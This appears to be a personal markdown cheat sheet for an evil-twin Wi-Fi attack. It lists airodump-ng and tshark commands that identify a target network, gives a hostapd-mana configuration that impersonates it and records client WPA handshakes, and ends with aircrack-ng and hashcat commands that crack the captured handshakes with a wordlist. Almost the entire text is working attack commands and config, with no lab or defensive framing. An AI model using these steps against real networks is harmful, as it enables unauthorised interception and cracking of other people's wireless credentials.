# Creating Rogue AP

- Discover the target AP
    - `sudo airodump-ng -w <filename> -output-format pcap wlan0mon`
- Use tshark with filter to find the AP names
    - `sudo tshark -r <filename>.pcap -Y "wlan.fc.type_subtype == 0x08 && wlan.ssid == apname"`
    
    *Interest parts are in Tag: Vendor Specific: & Tag: RSN: Information*
    
- Create Rogue AP
    - create a template hostapd-mana.conf file under `/etc/hostapd-mana/hostapd-mana.conf`
        
        ```bash
        # Template Config File for hostapd-mana command:
        interface=wlan0
        ssid=apname
        channel=1
        ieee80211n=1
        hw_mode=g # if 5ghz, set to a
        wpa=3 # 1 only enables WPA, 2 is WPA2
        wpa_key_mgmt=WPA-PSK
        wpa_passphrase=ANYPASSWORD # actual value irrelevant, as we are trying to capture handshake, has to be between 8 - 63 characters
        wpa_pairwise=TKIP CCMP # WPA only
        rsn_pairwise=TKIP CCMP # WPA2 only, since using option 3, we enable both
        mana_wpaout=/home/kali/name.hccapx # specifies where to save handshakes, each handshake is appended to the file, can be decrypted with hashcat -m 2500 or aircrack-ng
        # if mana_wpaout is producing error: unknown configuration item 'mana_wpaout' make sure you are using command hostapd-mana and not hostapd command
        ```
        
- Start hostapd-mana with the config file
    - `sudo hostapd-mana hostapd-mana.conf`
- After a .hccapx file is produce, crack it with aircrack or hashcat
    
    Using Aircrack-ng:
    
    - `sudo aircrack-ng <filename>.hccapx -w /wordlist/rockyou.txt`
        
        OR
        
    - `sudo aircrack-ng <filename>.hccapx -e <AP NAME> -w /usr/share/wordlists/rockyou.txt`
    
    Using hashcat:
    
    - `hashcat -m 2500 <filename>.hccapx /usr/share/wordlists/rockyou.txt`